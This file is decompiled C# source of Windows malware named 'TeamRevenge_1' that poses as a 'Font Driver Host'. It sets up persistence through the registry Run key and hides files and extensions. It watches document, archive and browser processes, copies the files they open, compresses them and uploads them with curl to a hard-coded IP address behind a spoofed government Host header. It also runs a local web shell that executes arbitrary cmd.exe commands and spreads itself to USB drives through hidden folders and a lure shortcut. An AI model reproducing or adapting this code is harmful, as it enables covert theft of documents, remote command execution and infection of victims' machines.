using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Microsoft.Win32;
using TeamRevenge_1.Properties;

namespace TeamRevenge_1;

internal class Program
{
	private static List<string> checksumsPassed = new List<string>();

	private static List<string> processes = new List<string>(new string[17]
	{
		"notepad", "winword", "excel", "wordpad", "7zfm", "winrar", "zip", "chrome", "iexplorer", "acrord32",
		"microsoftedge", "microsoftedgecp", "winzip", "acrobat", "openoffice", "libreoffice", "powerpoint"
	});

	private static string currentHash = "";

	private static bool batchUploadGoingOn = false;

	private static string calcMD5(string fileName)
	{
		try
		{
			using MD5 mD = MD5.Create();
			using FileStream inputStream = File.OpenRead(fileName);
			return Encoding.UTF8.GetString(mD.ComputeHash(inputStream));
		}
		catch
		{
			return "";
		}
	}

	private static void checkStartup()
	{
		try
		{
			RegistryKey? registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true);
			registryKey!.SetValue("Hidden", "2");
			registryKey!.SetValue("HideFileExt", "1");
			registryKey!.SetValue("ShowSuperHidden", "0");
		}
		catch
		{
		}
		try
		{
			currentHash = calcMD5(Assembly.GetExecutingAssembly().Location);
			string text = calcMD5(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DrvHost.exe");
			RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run", writable: true);
			if (text != currentHash)
			{
				try
				{
					File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DrvHost.exe");
				}
				catch
				{
				}
				File.Copy(Assembly.GetExecutingAssembly().Location, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DrvHost.exe", overwrite: true);
			}
			try
			{
				registryKey2.SetValue("Font Driver Host", "\"" + Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DrvHost.exe\"");
			}
			catch
			{
			}
			try
			{
				registryKey3.SetValue("Font Driver Host", "02 00 00 00 00 00 00 00 00 00 00 00 00");
			}
			catch
			{
			}
		}
		catch (Exception ex)
		{
			File.WriteAllText("err.txt", ex.ToString());
		}
	}

	private static void checkStartupWhile()
	{
		while (true)
		{
			checkStartup();
			Thread.Sleep(1000);
		}
	}

	private static void uploadFile(string fileName)
	{
		if (!batchUploadGoingOn)
		{
			batchUploadGoingOn = true;
			try
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\fontdrivertemp");
			}
			catch
			{
			}
			try
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DiscSoftLtd");
			}
			catch
			{
			}
			try
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google");
			}
			catch
			{
			}
			try
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\CrashReports");
			}
			catch
			{
			}
			string[] files = Directory.GetFiles("DiscSoftLtd");
			foreach (string text in files)
			{
				try
				{
					string text2 = "Google\\CrashReports\\" + Path.GetFileName(text);
					while (File.Exists(text2))
					{
						text2 += ".";
					}
					File.Move(text, text2);
					Process process = new Process();
					process.StartInfo.FileName = "curl.exe";
					process.StartInfo.CreateNoWindow = true;
					process.StartInfo.UseShellExecute = false;
					process.StartInfo.Arguments = "http://50.3.87.121/container/upload.php --header \"Host: meb.gov.tr\" -F \"file=@" + text2 + "\" -F \"machine=" + Environment.MachineName + "\"";
					process.StartInfo.RedirectStandardOutput = true;
					process.Start();
				}
				catch
				{
				}
			}
			batchUploadGoingOn = false;
		}
		bool flag = false;
		try
		{
			Process process2 = new Process();
			process2.StartInfo.FileName = "curl.exe";
			process2.StartInfo.CreateNoWindow = true;
			process2.StartInfo.UseShellExecute = false;
			process2.StartInfo.Arguments = "http://50.3.87.121/container/upload.php --header \"Host: meb.gov.tr\" -F \"file=@" + fileName + "\" -F \"machine=" + Environment.MachineName + "\"";
			process2.Start();
			process2.WaitForExit();
			if (process2.StandardOutput.ReadToEnd() == "OK")
			{
				flag = true;
			}
		}
		catch
		{
			flag = true;
		}
		if (flag)
		{
			try
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\fontdrivertemp");
			}
			catch
			{
			}
			try
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DiscSoftLtd");
			}
			catch
			{
			}
			try
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google");
			}
			catch
			{
			}
			try
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\CrashReports");
			}
			catch
			{
			}
			File.Move(fileName, "Google\\CrashReports\\" + fileName);
		}
		else
		{
			File.Move(fileName, "DiscSoftLtd\\" + fileName);
		}
	}

	private static void copyFiles()
	{
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		string containerName;
		while (true)
		{
			try
			{
				Process[] array = Process.GetProcesses();
				foreach (Process process in array)
				{
					if (!processes.Contains(process.ProcessName.ToLower()))
					{
						continue;
					}
					string text = "";
					try
					{
						ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT CommandLine FROM Win32_Process WHERE ProcessId = " + process.Id);
						try
						{
							ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
							try
							{
								while (enumerator.MoveNext())
								{
									ManagementBaseObject current = enumerator.get_Current();
									text += current.get_Item("CommandLine").ToString();
								}
							}
							finally
							{
								((IDisposable)enumerator)?.Dispose();
							}
						}
						finally
						{
							((IDisposable)val)?.Dispose();
						}
					}
					catch (Win32Exception)
					{
					}
					Match match = new Regex("(?:\\.exe|\\.EXE)\"? \"?(.*\\.)(docx|doc|xlsx|xls|pdf|DOCX|DOC|XLSX|XLS|PDF|zip|rar|ZIP|RAR|tgz|TGZ|txt|TXT|sql|SQL|gz|GZ|tar|TAR|7z|7Z)\"?").Match(text);
					if (!match.Success)
					{
						continue;
					}
					string text2 = (match.Groups[1].Value + match.Groups[2].Value).Replace("\"", "");
					string text3 = calcMD5(text2);
					if (checksumsPassed.Contains(text3))
					{
						continue;
					}
					try
					{
						Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\fontdrivertemp");
					}
					catch
					{
					}
					string text4 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\fontdrivertemp\\" + Path.GetFileName(text2);
					int num = 2;
					try
					{
						while (true)
						{
							if (File.Exists(text4))
							{
								if (!(calcMD5(text4) == text3))
								{
									text4 = Path.GetDirectoryName(text4) + "\\" + Path.GetFileNameWithoutExtension(text4) + " (" + num + ")." + Path.GetExtension(text4);
									num++;
									continue;
								}
								checksumsPassed.Add(calcMD5(text2));
								break;
							}
							checksumsPassed.Add(calcMD5(text2));
							File.Copy(text2, text4, overwrite: true);
							break;
						}
					}
					catch (Exception ex2)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\fontdrivertemp\\fontdriver.log", string.Concat("Unable to copy ", text2, " to ", text4, ".\r\nFull application parameters: ", text, "\r\nError details:", ex2.ToString(), "\r\n", DateTime.Today, "\r\n========================\r\n\r\n"));
					}
				}
				if (!File.Exists("curl.exe"))
				{
					byte[] curl = Resources.curl;
					File.WriteAllBytes("curl.exe", curl);
				}
				if (!File.Exists("7za.exe"))
				{
					byte[] _7za = Resources._7za;
					File.WriteAllBytes("7za.exe", _7za);
				}
				try
				{
					Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\fontdrivertemp");
				}
				catch
				{
				}
				if (Directory.GetFiles("fontdrivertemp").Length != 0)
				{
					Random random = new Random();
					containerName = "container_" + random.Next(0, 9999999) + ".7z";
					Process process2 = new Process();
					process2.StartInfo.FileName = "7za.exe";
					process2.StartInfo.Arguments = "a -t7z " + containerName + " ./fontdrivertemp/* -y";
					process2.StartInfo.CreateNoWindow = true;
					process2.StartInfo.UseShellExecute = false;
					process2.Start();
					process2.WaitForExit();
					Directory.Delete("fontdrivertemp", recursive: true);
					new Thread((ThreadStart)delegate
					{
						uploadFile(containerName);
					}).Start();
				}
				Thread.Sleep(1000);
			}
			catch (Exception ex3)
			{
				File.AppendAllText("error.txt", ex3.ToString());
			}
		}
	}

	private static void webServer()
	{
		try
		{
			HttpListener httpListener = new HttpListener();
			httpListener.Prefixes.Add("http://127.0.0.1:13337/");
			httpListener.Start();
			while (true)
			{
				try
				{
					HttpListenerContext context = httpListener.GetContext();
					HttpListenerResponse response = context.Response;
					string text = "";
					string text2 = context.Request.RawUrl!.TrimStart(new char[1] { '/' }).Replace("%20", " ");
					if (text2.StartsWith("?shell="))
					{
						try
						{
							string text3 = Regex.Split(text2, "\\?shell=")[1];
							Process process = new Process();
							process.StartInfo.FileName = "cmd.exe";
							process.StartInfo.Arguments = "/C " + text3;
							process.StartInfo.RedirectStandardOutput = true;
							process.StartInfo.UseShellExecute = false;
							process.StartInfo.CreateNoWindow = true;
							process.Start();
							process.WaitForExit(10000);
							text = process.StandardOutput.ReadToEnd();
						}
						catch (Exception ex)
						{
							text = ex.ToString();
						}
					}
					else if ((File.Exists(text2) || Directory.Exists(text2)) && context.Request.RawUrl != "/")
					{
						if (File.Exists(text2))
						{
							response.ContentType = "application/octet-stream";
							response.AddHeader("Content-Disposition", "attachment; filename=\"" + text2 + "\"");
							text = File.ReadAllText(text2);
						}
						else
						{
							text = "Shell Exec: ?shell=commandhere<br><br>";
							response.ContentType = "text/html";
							text += "Directories:<br>";
							string[] directories = Directory.GetDirectories(text2);
							for (int i = 0; i < directories.Length; i++)
							{
								string text4 = directories[i].TrimStart(".\\".ToCharArray()).TrimStart(text2.ToCharArray()).TrimStart(new char[1] { '\\' });
								text = text + "<a href=\"/" + text2 + "/" + text4 + "\">" + text4 + "</a><br>";
							}
							text += "<br>Files:<br>";
							directories = Directory.GetFiles(text2);
							for (int i = 0; i < directories.Length; i++)
							{
								string text5 = directories[i].TrimStart(".\\".ToCharArray()).TrimStart(text2.ToCharArray()).TrimStart(new char[1] { '\\' });
								text = text + "<a href=\"/" + text2 + "/" + text5 + "\">" + text5 + "</a><br>";
							}
						}
					}
					else
					{
						response.ContentType = "text/html";
						text = "Shell Exec: ?shell=commandhere<br><br>";
						text += "Directories:<br>";
						string[] directories = Directory.GetDirectories(".");
						for (int i = 0; i < directories.Length; i++)
						{
							string text6 = directories[i].TrimStart(".\\".ToCharArray());
							text = text + "<a href=\"" + text6 + "\">" + text6 + "</a><br>";
						}
						text += "<br>Files:<br>";
						directories = Directory.GetFiles(".");
						for (int i = 0; i < directories.Length; i++)
						{
							string text7 = directories[i].TrimStart(".\\".ToCharArray());
							text = text + "<a href=\"" + text7 + "\">" + text7 + "</a><br>";
						}
					}
					byte[] bytes = Encoding.UTF8.GetBytes(text);
					response.ContentLength64 = bytes.Length;
					Stream outputStream = response.OutputStream;
					outputStream.Write(bytes, 0, bytes.Length);
				}
				catch (Exception ex2)
				{
					try
					{
						HttpListenerResponse response2 = httpListener.GetContext().Response;
						response2.ContentType = "text/html";
						string s = "Web server error!<br>" + ex2.ToString();
						byte[] bytes2 = Encoding.UTF8.GetBytes(s);
						response2.ContentLength64 = bytes2.Length;
						Stream outputStream = response2.OutputStream;
						outputStream.Write(bytes2, 0, bytes2.Length);
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
	}

	private static double GetNextValidSize(double size, double[] validSizes)
	{
		double result = size;
		for (int i = 0; i < validSizes.Length; i++)
		{
			if (!(validSizes[i] < size))
			{
				result = validSizes[i];
				break;
			}
		}
		return result;
	}

	private static void usbSpreader()
	{
		while (true)
		{
			try
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				foreach (DriveInfo driveInfo in drives)
				{
					if (driveInfo.DriveType != DriveType.Removable || driveInfo.TotalFreeSpace <= 350000L)
					{
						continue;
					}
					string text = driveInfo.VolumeLabel + " (" + GetNextValidSize(driveInfo.TotalSize / 1024L / 1024L / 1024L, new double[12]
					{
						1.0, 2.0, 4.0, 8.0, 16.0, 32.0, 64.0, 128.0, 256.0, 512.0,
						1024.0, 999999.0
					}) + " GB)";
					try
					{
						string[] directories = Directory.GetDirectories(driveInfo.RootDirectory.ToString(), "*", SearchOption.TopDirectoryOnly);
						foreach (string text2 in directories)
						{
							string text3 = text2;
							if (!text3.StartsWith(string.Concat(driveInfo.RootDirectory, "\u00a0\u00a0")))
							{
								int num = 1;
								while (Directory.Exists(string.Concat(driveInfo.RootDirectory, "\\\u00a0\u00a0\\\u00a0\u00a0\\", Path.GetFileName(text3))))
								{
									text3 = Path.GetDirectoryName(text2) + "\\" + Path.GetFileName(text2) + " (" + num + ")";
									num++;
								}
								Directory.Move(text2, string.Concat(driveInfo.RootDirectory, "\\\u00a0\u00a0\\\u00a0\u00a0\\", Path.GetFileName(text3)));
							}
						}
						directories = Directory.GetFiles(driveInfo.RootDirectory.ToString(), "*", SearchOption.TopDirectoryOnly);
						foreach (string text4 in directories)
						{
							string path = text4;
							try
							{
								if (Path.GetFileNameWithoutExtension(path) != text + "\u00a0")
								{
									int num2 = 1;
									while (File.Exists(string.Concat(driveInfo.RootDirectory, "\\\u00a0\u00a0\\\u00a0\u00a0\\", Path.GetFileName(path))))
									{
										path = Path.GetDirectoryName(text4) + "\\" + Path.GetFileNameWithoutExtension(text4) + " (" + num2 + ")" + Path.GetExtension(text4);
										num2++;
									}
									File.Move(text4, string.Concat(driveInfo.RootDirectory, "\\\u00a0\u00a0\\\u00a0\u00a0\\", Path.GetFileName(path)));
								}
							}
							catch (Exception ex)
							{
								File.AppendAllText("try.txt", ex.ToString());
							}
						}
						File.Copy(Assembly.GetExecutingAssembly().Location, string.Concat(driveInfo.RootDirectory, "\\\u00a0\u00a0\\DrvHost.exe"), overwrite: true);
					}
					catch
					{
					}
					try
					{
						if (!File.Exists(string.Concat(driveInfo.RootDirectory, "\\", text, "\u00a0.lnk")))
						{
							byte[] uSB_Bellek = Resources.USB_Bellek;
							File.WriteAllBytes(string.Concat(driveInfo.RootDirectory, "\\", text, "\u00a0.lnk"), uSB_Bellek);
						}
					}
					catch (Exception ex2)
					{
						File.AppendAllText("err.txt", ex2.ToString());
					}
					if (!Directory.Exists(string.Concat(driveInfo.RootDirectory, "\u00a0\u00a0")) || !File.Exists(string.Concat(driveInfo.RootDirectory, "\u00a0\u00a0\\DrvHost.exe")))
					{
						try
						{
							Directory.CreateDirectory(string.Concat(driveInfo.RootDirectory, "\\\u00a0\u00a0\\"));
						}
						catch
						{
						}
						try
						{
							Directory.CreateDirectory(string.Concat(driveInfo.RootDirectory, "\\\u00a0\u00a0\\\u00a0\u00a0\\"));
						}
						catch
						{
						}
						try
						{
							string[] directories = Directory.GetDirectories(driveInfo.RootDirectory.ToString(), "*", SearchOption.TopDirectoryOnly);
							foreach (string text5 in directories)
							{
								string text6 = text5;
								if (!text6.StartsWith(string.Concat(driveInfo.RootDirectory, "\u00a0\u00a0")))
								{
									int num3 = 1;
									while (Directory.Exists(string.Concat(driveInfo.RootDirectory, "\\\u00a0\u00a0\\\u00a0\u00a0\\", Path.GetFileName(text6))))
									{
										text6 = Path.GetDirectoryName(text5) + "\\" + Path.GetFileName(text5) + " (" + num3 + ")";
										num3++;
									}
									Directory.Move(text5, string.Concat(driveInfo.RootDirectory, "\\\u00a0\u00a0\\\u00a0\u00a0\\", Path.GetFileName(text6)));
								}
							}
							directories = Directory.GetFiles(driveInfo.RootDirectory.ToString(), "*", SearchOption.TopDirectoryOnly);
							foreach (string text7 in directories)
							{
								string path2 = text7;
								try
								{
									if (Path.GetFileNameWithoutExtension(path2) != text + "\u00a0")
									{
										int num4 = 1;
										while (File.Exists(string.Concat(driveInfo.RootDirectory, "\\\u00a0\u00a0\\\u00a0\u00a0\\", Path.GetFileName(path2))))
										{
											path2 = Path.GetDirectoryName(text7) + "\\" + Path.GetFileNameWithoutExtension(text7) + " (" + num4 + ")." + Path.GetExtension(text7);
											num4++;
										}
										File.Move(text7, string.Concat(driveInfo.RootDirectory, "\\\u00a0\u00a0\\\u00a0\u00a0\\", Path.GetFileName(path2)));
									}
								}
								catch
								{
								}
							}
							File.Copy(Assembly.GetExecutingAssembly().Location, string.Concat(driveInfo.RootDirectory, "\\\u00a0\u00a0\\DrvHost.exe"), overwrite: true);
						}
						catch
						{
						}
						try
						{
							File.SetAttributes(string.Concat(driveInfo.RootDirectory, "\u00a0\u00a0\\"), FileAttributes.Hidden | FileAttributes.System);
						}
						catch (Exception ex3)
						{
							File.AppendAllText("err.txt", ex3.ToString());
						}
						try
						{
							File.Delete(string.Concat(driveInfo.RootDirectory, "\\", text, "\u00a0.lnk"));
						}
						catch
						{
						}
						try
						{
							byte[] uSB_Bellek2 = Resources.USB_Bellek;
							File.WriteAllBytes(string.Concat(driveInfo.RootDirectory, "\\", text, "\u00a0.lnk"), uSB_Bellek2);
						}
						catch (Exception ex4)
						{
							File.AppendAllText("err.txt", ex4.ToString());
						}
					}
					if (calcMD5(string.Concat(driveInfo.RootDirectory, "\\\u00a0\u00a0\\DrvHost.exe")) != currentHash)
					{
						File.Copy(Assembly.GetExecutingAssembly().Location, string.Concat(driveInfo.RootDirectory, "\\\u00a0\u00a0\\DrvHost.exe"), overwrite: true);
					}
				}
			}
			catch
			{
			}
			Thread.Sleep(3000);
		}
	}

	private static void Main(string[] args)
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				try
				{
					if (driveInfo.DriveType == DriveType.Removable && driveInfo.RootDirectory.ToString() == Path.GetPathRoot(Assembly.GetEntryAssembly()!.Location))
					{
						Process.Start(new ProcessStartInfo("explorer", "\"" + Path.GetPathRoot(Assembly.GetEntryAssembly()!.Location) + "\u00a0\u00a0\\\u00a0\u00a0\\\""));
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		try
		{
			Process currentProcess = Process.GetCurrentProcess();
			Process[] processesByName = Process.GetProcessesByName(currentProcess.ProcessName);
			foreach (Process process in processesByName)
			{
				if (process.Id != currentProcess.Id)
				{
					process.Kill();
				}
			}
			checkStartup();
			if (Environment.CurrentDirectory != Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData))
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DrvHost.exe",
					WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
				});
				Process.GetCurrentProcess().Kill();
			}
			else
			{
				new Thread(checkStartupWhile).Start();
			}
		}
		catch
		{
		}
		try
		{
			new Thread(copyFiles).Start();
		}
		catch
		{
		}
		try
		{
			new Thread(webServer).Start();
		}
		catch
		{
		}
		try
		{
			new Thread(usbSpreader).Start();
		}
		catch
		{
		}
	}
}
